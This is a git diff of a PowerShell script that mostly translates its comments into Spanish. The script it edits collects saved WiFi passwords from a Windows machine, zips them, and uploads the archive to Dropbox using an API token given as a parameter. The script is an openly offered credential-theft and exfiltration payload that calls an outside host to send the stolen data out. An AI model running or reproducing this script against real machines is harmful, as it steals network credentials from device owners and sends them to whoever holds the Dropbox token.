@@ -1,7 +1,9 @@
+# Define el parámetro para el token de acceso de Dropbox
 param (
     [string]$db
 )
 
+# Función para subir archivos a Dropbox
 function DropBox-Upload {
     [CmdletBinding()]
     param (
@@ -9,7 +11,6 @@ function DropBox-Upload {
         [Alias("f")]
         [string]$SourceFilePath
     )
-    # Prepare Dropbox API parameters
     $outputFile = Split-Path $SourceFilePath -leaf
     $TargetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -20,7 +21,7 @@ function DropBox-Upload {
         "Content-Type" = 'application/octet-stream'
     }
 
-    # Add header to the file content
+    # Añadir encabezado al contenido del archivo
     $header = @"
 ########################################################################################################################
 #    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
@@ -37,13 +38,14 @@ function DropBox-Upload {
     $tempFilePath = [System.IO.Path]::GetTempFileName()
     Set-Content -Path $tempFilePath -Value $combinedContent
 
-    # Upload the file to Dropbox
+    # Subir el archivo a Dropbox
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $tempFilePath -Headers $headers
 
-    # Clean up temporary file
+    # Limpiar el archivo temporal
     Remove-Item -Path $tempFilePath -Force
 }
 
+# Función para obtener las contraseñas WiFi
 function Get-WifiPasswords {
     $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
     $userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
@@ -63,15 +65,17 @@ function Get-WifiPasswords {
 }
 
 try {
-    # Retrieve WiFi passwords and compress them
+    # Obtener y comprimir las contraseñas WiFi
     $zipFilePath = Get-WifiPasswords
 
-    # Upload to Dropbox if token is provided
+    # Subir a Dropbox si se proporciona el token
     if (-not ([string]::IsNullOrEmpty($db))) {
         DropBox-Upload -f $zipFilePath
+    } else {
+        Write-Error "No se proporcionó el token de acceso de Dropbox."
     }
 
-    # Clean up the zip file
+    # Limpiar el archivo ZIP
     Remove-Item -Path $zipFilePath -Force
 }
 catch {
